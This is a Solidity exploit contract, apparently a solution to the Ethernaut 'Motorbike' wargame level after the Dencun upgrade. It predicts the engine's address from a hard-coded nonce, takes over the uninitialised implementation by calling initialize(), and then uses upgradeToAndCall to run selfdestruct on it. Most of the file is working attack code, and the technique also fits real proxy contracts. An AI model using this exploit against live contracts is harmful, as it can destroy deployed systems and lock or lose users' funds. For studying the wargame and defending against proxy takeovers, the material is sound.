// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

interface Ethernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}
interface Statistics {

}

contract HackContract {
    address private engineContractAddress = 0xfa483Fc89307d204A71CF30D25AC05128Cac3182;
    Engine private e = Engine(engineContractAddress);
    uint256 constant private nonce = 7433;
    constructor() {
        
    }

    function hack() external returns (address levelContractAddress, address engineContractAddress) {
        Ethernaut factory = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        factory.createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);

        engineContractAddress = computeCreateAddress(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, nonce);
        levelContractAddress = computeCreateAddress(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, nonce + 1);

        Engine e = Engine(engineContractAddress);
        e.initialize();
        e.upgradeToAndCall(address(this), abi.encodeWithSelector(this.selfkill.selector));
    }

    function selfkill() external {
        selfdestruct(payable(msg.sender));
    }

    // COPY from https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/blob/main/contracts/AddressHelper.sol
    function isContract(address _addr) public view returns (bool) {
        // https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    // The code below is adapted from https://github.com/OoXooOx/Predict-smart-contract-address/blob/main/AddressPredictorCreateOpcode.sol
    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }

    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        // forgefmt: disable-start
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))));
        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))));
        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));
        // forgefmt: disable-end

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        // 0xda = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x84 ++ nonce)
        // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)
        // 0x84 = 0x80 + 0x04 (0x04 = the bytes length of the nonce, 4 bytes, in hex)
        // We assume nobody can have a nonce large enough to require more than 32 bytes.
        return addressFromLast20Bytes(
            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
        );
    }
}
